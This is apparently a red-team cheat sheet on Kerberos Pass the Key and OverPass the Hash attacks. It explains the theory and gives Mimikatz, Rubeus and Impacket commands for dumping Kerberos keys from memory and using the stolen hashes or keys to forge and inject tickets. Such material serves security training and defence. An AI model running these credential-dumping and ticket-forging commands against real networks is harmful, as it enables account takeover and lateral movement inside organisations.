# Pass the Key / OverPass the Hash 
- https://lisandre.com/archives/14788
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key
- https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/
- https://www.thehacker.recipes/ad/movement/kerberos/ptk


## Theory
Kerberos offers 4 different key types: DES, RC4, AES-128 and AES-256.

- When the RC4 etype is enabled, the RC4 key can be used. The problem is that the RC4 key is in fact the user's NT hash. Using a an NT hash to obtain Kerberos tickets is called overpass the hash.

- When RC4 is disabled, other Kerberos keys (DES, AES-128, AES-256) can be passed as well. This technique is called pass the key. In fact, only the name and key used differ between overpass the hash and pass the key, the technique is the same.

The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT). 

To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module sekurlsa::ekeys. This module will enumerate all key types present for the Kerberos package.

## Practice
=== "Windows"

    ```powershell
    # extract Kerberos Keys
    > mimikatz.exe
    > privilege::debug
    > sekurlsa::ekeys
    ```

    Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus.

    === "Mimikatz"

        ```powershell
        > mimikatz.exe
        > privilege::debug

        # with an NT hash
        > sekurlsa::pth /user:$USER /domain:$DOMAIN /(rc4/ntlm):$NThash /ptt

        # with an AES 128 key
        > sekurlsa::pth /user:$USER /domain:$DOMAIN /aes128:$aes128_key /ptt

        # with an AES 256 key
        > sekurlsa::pth /user:$USER /domain:$DOMAIN /aes256:$aes256_key /ptt
        ```

        This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.
    
    === "Rubeus"

        To forge a ticket using Rubeus, we can use the module asktgt with the username, domain, and hash which can be /rc4, /aes128, /aes256, or /des.

        ```powershell
        # with an NT hash
        > Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /rc4:$NThash /ptt /nowrap

        # with an AES 128 key
        > Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes128:$aes128_key /ptt /nowrap

        # with an AES 256 key
        > Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes256:$aes256_key /ptt /nowrap
        ```

    !!! Tip
        For both mimikatz and Rubeus, the /ptt flag is used to automatically inject the ticket.

    !!! Note
        Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

    !!! Note
        Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a     rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."`

=== "UNIX-like"
   
    The Impacket script getTGT (Python) can request a TGT (Ticket Granting Ticket) given a password, hash (LMhash can be empty), or aesKey. The TGT will be saved as a .ccache file that can then be used by other Impacket scripts.

    ```bash
    # with an NT hash (overpass-the-hash)
    $ getTGT.py -dc-ip <IP> -hashes '<LMhash:NThash>' <DOMAIN>/<USER>

    # with an AES (128 or 256 bits) key (pass-the-key)
    $ getTGT.py -dc-ip <IP> -aesKey '<aes Key>' <DOMAIN>/<USERNAME>@<IP>
    ```
